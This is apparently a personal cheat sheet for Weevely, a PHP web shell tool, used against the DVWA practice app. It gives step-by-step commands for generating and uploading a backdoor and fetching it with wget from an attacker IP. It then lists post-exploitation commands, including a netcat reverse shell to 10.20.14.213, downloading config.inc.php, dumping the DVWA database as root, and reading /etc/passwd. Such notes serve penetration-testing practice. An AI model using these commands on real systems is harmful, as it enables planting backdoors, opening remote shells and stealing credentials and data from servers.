# Weevely

## Usage
1. Genrate backdoor in Kali
   - ```weevely generate [password] [file name]```
   -  ```weevely generate 123456 /root/shell.php```
2. Upload 
   - we have an input field
     -  Upload *"shell.php"* in vulnerable app (DVWA-Low)
   - we access to system shell
     - ```wget http://10.20.14.213/shell.txt``` 
     - ```mv shell.txt shell.php```
3. Run
   - Send a request to uploaded php file *"http://192.168.152.132/dvwa/hackable/uploads/shell.php"*
4. Connect to shell from Kali
   - ```weevely [url o file] [password]```
   -  ```weevely http://192.168.152.132/dvwa/hackable/uploads/shell.php```

## Weevely commands
- List weevely functions
  - ```help```
- Help of a specific function 
  - ```[function name] -h```   
- Run weevely functions
  - ```[function name]```
- Download
  - ```file_download -vector [VECTOR] [FileName] -host [HOST] [location to store file]```
  - ```file_download -vector file config.inc.php /root/config-downloaded.txt```
  - different vector should be checked, until one of them works
- Upload
  - ```file_upload -vector [VECTOR] [location on local machine] [location to store file]```
  - ```file_upload /root/test.txt ./test-shell-uploaded.txt```
- Reverse shell
  - ```backdoor_reversetcp -vector [VECTOR] [Your IP] [PORT]```
  - ```backdoor_reversetcp -vector netcat 10.20.14.213 8080```
- Access database
  - ```sql_console```
  - ```sql_dump -vector [VECTOR] -host [HOST] -lpath [location to store data] [DB Name] [username] [password]```
  - ```sql_dump -vector mysqldump_sh -host localhost -lpath /root/dvwa-data.txt dvwa root```
- Other functions
  - ```whoami``` 
  - ```shell_sh [command]```
  - ```shell_sh -v [vector] [command]```
  - ```system_info```
  - ```audit_etcpasswd -vector posix_getpwuid```
